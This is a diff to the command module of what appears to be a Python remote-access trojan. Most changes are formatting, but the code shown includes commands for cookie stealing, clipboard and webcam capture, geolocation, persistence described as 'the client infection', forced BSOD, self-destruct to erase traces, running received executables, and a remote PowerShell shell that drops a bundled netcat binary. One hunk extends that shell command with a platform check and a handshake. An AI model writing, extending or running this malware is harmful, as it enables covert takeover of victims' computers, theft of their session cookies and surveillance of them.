@@ -107,7 +107,7 @@ class LaunchExecutableFile(DoubleCommand):
         executable_contents = recieve_bytes(sock)
         if executable_contents == b"EXIT":
             return
-        executable_path = f"{tempfile.gettempdir()}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}{'.exe' if sys.platform == "win32" else ''}"
+        executable_path = f"{tempfile.gettempdir()}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}{'.exe' if sys.platform == 'win32' else ''}"
         if sys.platform != "win32":
             os.chmod(executable_path, os.stat(executable_path).st_mode | stat.S_IEXEC)
         try:
@@ -158,7 +158,13 @@ class LaunchExecutableFile(DoubleCommand):
         return CommandResult(DoubleCommandResult.success, proc_pid)
 
 
-@add_double_command("invoke_bsod", "invoke_bsod", "Invokes a BSOD on the client", [], supported_os=[OSType.ms_windows])
+@add_double_command(
+    "invoke_bsod",
+    "invoke_bsod",
+    "Invokes a BSOD on the client",
+    [],
+    supported_os=[OSType.ms_windows],
+)
 class InvokeBSOD(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
@@ -201,7 +207,7 @@ class InvokeBSOD(DoubleCommand):
     "show_image [ local image path ]",
     "Displays an image on the clients screen",
     [ArgumentType.string],
-    required_client_modules=["Pillow"]
+    required_client_modules=["Pillow"],
 )
 class ShowImage(DoubleCommand):
     @staticmethod
@@ -526,7 +532,8 @@ class CaptureWebcamImage(DoubleCommand):
     "add_persistence",
     "Adds the client infection to PC startup",
     [],
-    str, supported_os=[OSType.ms_windows]
+    str,
+    supported_os=[OSType.ms_windows],
 )
 class AddPersistence(DoubleCommand):
     @staticmethod
@@ -647,7 +654,7 @@ class AddPersistence(DoubleCommand):
     "reboot { delay seconds }",
     "Reboots the client PC",
     [ArgumentType.optional_float],
-    required_client_modules=["rebooter"]
+    required_client_modules=["rebooter"],
 )
 class Reboot(DoubleCommand):
     @staticmethod
@@ -692,7 +699,7 @@ class Reboot(DoubleCommand):
     "shutdown { delay seconds }",
     "Turns off the client PC",
     [ArgumentType.optional_float],
-    required_client_modules=["rebooter"]
+    required_client_modules=["rebooter"],
 )
 class Shutdown(DoubleCommand):
     @staticmethod
@@ -737,7 +744,7 @@ class Shutdown(DoubleCommand):
     "self_destruct",
     "Self destructs and removes all trace of infection on the client side",
     [],
-    supported_os=[OSType.ms_windows]
+    supported_os=[OSType.ms_windows],
 )
 class SelfDestruct(DoubleCommand):
     @staticmethod
@@ -794,7 +801,7 @@ class SelfDestruct(DoubleCommand):
     "Downloads cookies from the client",
     [],
     str,
-    supported_os=[OSType.ms_windows]
+    supported_os=[OSType.ms_windows],
 )
 class CookieStealer(DoubleCommand):
     @staticmethod
@@ -1237,7 +1244,7 @@ class ListDirectory(DoubleCommand):
             path = recieve_string(sock, True)
         except OSError:
             return
-        
+
         get_items_status = b"y"
         try:
             dir_items = os.listdir(path)
@@ -1245,12 +1252,12 @@ class ListDirectory(DoubleCommand):
             get_items_status = b"f"
         except OSError:
             get_items_status = b"n"
-        
+
         try:
             sock.sendall(get_items_status)
         except OSError:
             return
-        
+
         if get_items_status != b"y":
             return
 
@@ -1277,13 +1284,13 @@ class ListDirectory(DoubleCommand):
         except OSError:
             print("Failed to send path to client")
             return CommandResult(DoubleCommandResult.conn_error)
-        
+
         try:
             get_items_status = client.socket.recv(1)
         except OSError:
             print("Sent directory but client did not repond with a success indicator")
             return CommandResult(DoubleCommandResult.conn_error)
-        
+
         match get_items_status:
             case b"y":
                 pass
@@ -1293,7 +1300,7 @@ class ListDirectory(DoubleCommand):
             case b"n":
                 print("Client could not read directory")
                 return CommandResult(DoubleCommandResult.failure)
-        
+
         try:
             contents = recieve_string(client.socket, True)
             print(contents)
@@ -1765,7 +1772,7 @@ class GetClipboard(DoubleCommand):
     "popup",
     "popup [ title ] [ message ] { level }",
     "Displays a popup message on the clients screen",
-    [ArgumentType.string, ArgumentType.string, ArgumentType.optional_string]
+    [ArgumentType.string, ArgumentType.string, ArgumentType.optional_string],
 )
 class Popup(DoubleCommand):
     @staticmethod
@@ -1793,7 +1800,7 @@ class Popup(DoubleCommand):
             cancel = recieve_boolean(sock)
         except OSError:
             return
-        
+
         if cancel:
             return
 
@@ -1821,7 +1828,11 @@ class Popup(DoubleCommand):
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
-        if len(params) == 3 and params[2].casefold() not in ("info", "warning", "error"):
+        if len(params) == 3 and params[2].casefold() not in (
+            "info",
+            "warning",
+            "error",
+        ):
             try:
                 send_boolean(client.socket, True)
             except OSError:
@@ -1945,6 +1956,7 @@ class Geolocate(DoubleCommand):
         return CommandResult(DoubleCommandResult.success, info.all)
 
 
+# TODO: Make it multi os
 @add_double_command(
     "shell",
     "shell",
@@ -1953,7 +1965,7 @@ class Geolocate(DoubleCommand):
     supported_os=[OSType.ms_windows],
     no_new_process=True,
     no_multitask=True,
-    max_selected=1
+    max_selected=1,
 )
 class Shell(DoubleCommand):
     @staticmethod
@@ -1985,6 +1997,12 @@ class Shell(DoubleCommand):
                     sock.send(process.stdout.read(1))  # type: ignore
                 except OSError:
                     return
+                
+        try:
+            if not recieve_boolean(sock):
+                return
+        except OSError:
+            return
 
         powershell_process = subprocess.Popen(
             ["powershell"],
@@ -2024,6 +2042,16 @@ class Shell(DoubleCommand):
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
+        import sys
+
+        if sys.platform != "win32":
+            print("You must be on windows to use this command")
+            try:
+                send_boolean(client.socket, False)
+            except OSError:
+                pass
+            return CommandResult(DoubleCommandResult.failure)
+
         from shared.command_consts import NETCAT_B64_ZLIB_EXE
         import subprocess
         import socket
@@ -2041,6 +2069,12 @@ class Shell(DoubleCommand):
         def bail(msg: str) -> None:
             print(msg)
             os.remove(temp_file)
+
+        try:
+            send_boolean(client.socket, True)
+        except OSError:
+            print("Failed to sent verification message to client")
+            return CommandResult(DoubleCommandResult.conn_error)
 
         temp_file = f"{os.getenv('TEMP')}/nc.exe"
         with open(temp_file, "wb") as netcat_exe:
